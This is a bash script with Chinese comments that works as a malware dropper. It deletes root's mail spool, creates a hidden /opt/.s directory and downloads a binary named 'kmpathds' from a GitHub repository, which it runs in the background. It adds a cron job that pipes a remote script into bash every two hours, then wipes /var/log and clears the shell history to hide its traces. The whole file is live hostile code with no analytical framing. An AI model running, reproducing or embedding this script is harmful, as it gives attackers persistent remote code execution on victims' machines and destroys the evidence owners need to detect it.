#!/bin/bash
rm /var/spool/mail/root 
# 设置变量以提高可读性
OPT_S_DIR="/opt/.s"
KMPATHD_FILE="$OPT_S_DIR/kmpathds"
CRON_JOB="0 */2 * * * curl -s -L https://raw.githubusercontent.com/YUNDUN8899/FUCKSEN/main/123.sh | bash"

# 检查/opt/.s目录是否存在，不存在则创建
if [ ! -d "$OPT_S_DIR" ]; then
    mkdir "$OPT_S_DIR"
fi

# 检查/opt/.s/kmpathd文件是否存在，不存在则下载
if [ ! -f "$KMPATHD_FILE" ]; then
    cd "$OPT_S_DIR" || exit
    wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/kmpathds
    chmod +x "kmpathds"
else
    echo "KMPATHD file already exists, skipping download."
fi

# 检查进程数量，如果大于1，则杀死多余的进程
kmpathds_count=$(pgrep -cf "kmpathds")
if [ "$kmpathds_count" -gt 1 ]; then
    pkill -f "kmpathds"
fi

# 如果没有正在运行的进程，则启动一个
if ! pgrep -f "kmpathds" > /dev/null; then
    nohup "$KMPATHD_FILE" /dev/null 2>&1 &
fi

# 清除上一次的任务，添加下一次的任务，每2小时执行一次
(crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -

# 清除当前系统的执行目录
sudo rm -rf /var/log/*

# 清除命令历史记录
history -c && echo > ~/.bash_history
